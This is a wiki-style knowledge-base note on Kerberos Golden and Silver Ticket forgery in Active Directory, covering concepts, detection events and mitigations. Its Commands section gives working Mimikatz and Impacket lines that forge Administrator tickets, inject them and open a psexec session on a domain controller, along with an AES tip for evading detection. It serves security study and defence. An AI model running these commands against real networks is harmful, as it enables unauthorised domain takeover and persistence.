---
title: Golden & Silver Ticket Attacks
type: source
created: 2026-06-12
updated: 2026-06-12
tags: [kerberos, active-directory, persistence, privilege-escalation]
source: raw/golden_silver_tickets.md
---

# Golden & Silver Ticket Attacks

> Source: `raw/golden_silver_tickets.md` (Gemini research summary)

## Summary

Both attacks *forge* Kerberos tickets offline using a stolen secret, then
present them as valid.

- **Golden Ticket**: forge a TGT using the [[krbtgt]] secret (usually
  obtained via [[dcsync]]). Grants domain-wide access as any user with any
  group membership. DC is contacted at the TGS-request stage.
- **Silver Ticket**: forge a TGS using a *specific service account's*
  secret + its SPN. Scoped to that service/host only — the DC is **never**
  contacted, making it harder to detect at the domain level.

## Comparison

| | Golden Ticket | Silver Ticket |
|---|---|---|
| Forged | TGT | TGS |
| Secret | `krbtgt` hash/AES key | service account hash/AES key |
| Scope | entire domain | one service/host |
| DC contacted | yes (TGS request) | no |
| Fix | rotate `krbtgt` x2 | rotate service account secret |

## Key points

- **Tools**: Mimikatz, Rubeus.
- **Detection**: Golden — 4769 with no matching 4768, RC4 downgrade,
  abnormal ticket lifetimes, tickets for non-existent users. Silver — host
  Event 4624 with no corresponding DC-side TGS request; PAC validation
  failures.
- **Mitigations**: [[krbtgt]] double rotation (Golden), [[gmsa]] (Silver),
  [[ad-tiering-and-hardening|tiered admin model]], PAC validation
  enforcement, Kerberos Armoring (FAST).

## Commands

```powershell
# Golden Ticket — Mimikatz (needs krbtgt NTLM hash or AES key + domain SID)
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<krbtgt_nthash> /ptt

# Golden Ticket with AES256 (avoids RC4 downgrade signal)
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /aes256:<krbtgt_aes256key> /ptt
```

```bash
# Golden Ticket — Impacket ticketer.py (produces a .ccache to export)
ticketer.py -nthash <krbtgt_nthash> -domain-sid S-1-5-21-... -domain corp.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py corp.local/Administrator@dc01.corp.local -k -no-pass
```

```powershell
# Silver Ticket — Mimikatz (needs the *service account's* hash + its SPN)
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:fileserver.corp.local /service:cifs /rc4:<svc_account_nthash> /ptt
```

```bash
# Silver Ticket — Impacket (e.g. forging a CIFS ticket for a target host)
ticketer.py -nthash <svc_account_nthash> -domain-sid S-1-5-21-... -domain corp.local -spn cifs/fileserver.corp.local Administrator
```

## Links

- [[krbtgt]] — central to Golden Ticket
- [[dcsync]] — typical way to obtain the `krbtgt` secret
- [[kerberos-authentication]] — TGT/TGS overview
- [[gmsa]] — mitigates Silver Ticket
